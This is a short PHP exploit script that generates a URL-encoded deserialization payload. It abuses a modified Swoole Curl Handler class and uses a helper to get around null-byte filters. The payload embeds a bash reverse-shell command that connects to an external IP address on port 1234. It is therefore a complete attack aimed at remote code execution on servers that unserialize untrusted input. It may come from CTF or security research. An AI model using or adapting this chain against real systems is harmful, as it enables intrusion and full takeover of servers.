<?php
// Author: Wupco (http://www.wupco.cn/)

// https://github.com/swoole/library/blob/master/src/core/Curl/Handler.php#L309-L319
// delete(L309-L319) (bypass is_resource check) and change class name to Handlep
include('Handler.php');

// bypass %00
function process_serialized($serialized) {
        $new = '';
        $last = 0;
        $current = 0;
        $pattern = '#\bs:([0-9]+):"#';

        while(
            $current < strlen($serialized) &&
            preg_match(
                $pattern, $serialized, $matches, PREG_OFFSET_CAPTURE, $current
            )
        )
        {

            $p_start = $matches[0][1];
            $p_start_string = $p_start + strlen($matches[0][0]);
            $length = $matches[1][0];
            $p_end_string = $p_start_string + $length;

            # Check if this really is a serialized string
            if(!(
                strlen($serialized) > $p_end_string + 2 &&
                substr($serialized, $p_end_string, 2) == '";'
            ))
            {
                $current = $p_start_string;
                continue;
            }
            $string = substr($serialized, $p_start_string, $length);

            # Convert every special character to its S representation
            $clean_string = '';
            for($i=0; $i < strlen($string); $i++)
            {
                $letter = $string{$i};
                $clean_string .= ctype_print($letter) && $letter != '\\' ?
                    $letter :
                    sprintf("\\%02x", ord($letter));
                ;
            }

            # Make the replacement
            $new .= 
                substr($serialized, $last, $p_start - $last) .
                'S:' . $matches[1][0] . ':"' . $clean_string . '";'
            ;
            $last = $p_end_string + 2;
            $current = $last;
        }

        $new .= substr($serialized, $last);
        return $new;

}
$o = new Swoole\Curl\Handlep("http://baidu.com/");
$o->setOpt(CURLOPT_READFUNCTION,"array_walk");
$o->setOpt(CURLOPT_FILE, "array_walk");
$o->exec = array('/bin/bash -c "bash -i >& /dev/tcp/192.3.81.170/1234 0>&1"');
$o->setOpt(CURLOPT_POST,1);
$o->setOpt(CURLOPT_POSTFIELDS,"aaa");
$o->setOpt(CURLOPT_HTTPHEADER,["Content-type"=>"application/json"]);
$o->setOpt(CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);

$a = serialize([$o,'exec']);
echo str_replace("Handlep", "Handler", urlencode(process_serialized($a)));

?>